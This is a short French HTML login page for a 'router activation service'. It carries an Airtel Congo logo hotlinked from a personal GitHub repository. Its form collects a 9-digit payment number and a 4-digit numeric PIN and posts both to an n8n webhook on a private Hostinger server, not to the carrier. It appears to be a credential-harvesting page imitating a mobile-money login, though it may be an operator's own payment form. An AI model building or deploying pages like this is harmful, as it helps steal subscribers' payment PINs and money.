<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Formulaire d'Authentification</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: Arial, sans-serif;
      background-color: #f2f2f2;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .card {
      background-color: white;
      padding: 30px 40px;
      border-radius: 12px;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
      width: 300px;
    }

    form {
      display: flex;
      flex-direction: column;
      gap: 20px;
    }

    label {
      margin-bottom: 5px;
      font-weight: bold;
    }

    input {
      padding: 10px;
      font-size: 16px;
      border: 1px solid #ccc;
      border-radius: 6px;
    }

    button {
      padding: 12px;
      font-size: 16px;
      background-color: #007bff;
      color: white;
      border: none;
      border-radius: 6px;
      cursor: pointer;
    }

    button:hover {
      background-color: #0056b3;
    }
  </style>
</head>
<body>

  <header>
    <img src="https://raw.githubusercontent.com/christale-kib/routeur-paiement/main/Airtel_Congo.jpg" alt="Logo">
    <h1>Service d'activation de routeur</h1>
  </header>

  <div class="card">
    <h2>Authentification</h2>
    <form action="https://n8n.srv878521.hstgr.cloud/webhook/Authentification?id=${id}&numero_routeur=${numero_routeur}" method="POST">
      
      <div>
        <label for="numero">Numéro</label>
        <input type="text" id="numero" name="numero_paiement" pattern="\\d{9}" inputmode="numeric" maxlength="9" required>
      </div>

      <div>
        <label for="password">Mot de passe</label>
        <input type="password" id="password" name="password" pattern="\\d{4}" inputmode="numeric" maxlength="4" required>
      </div>

      <button type="submit">Valider</button>
    </form>
  </div>

<footer>
  <p>&copy; 2025 - Service d'activation de Routeur. Tous droits réservés.</p>
</footer>

</body>
</html>
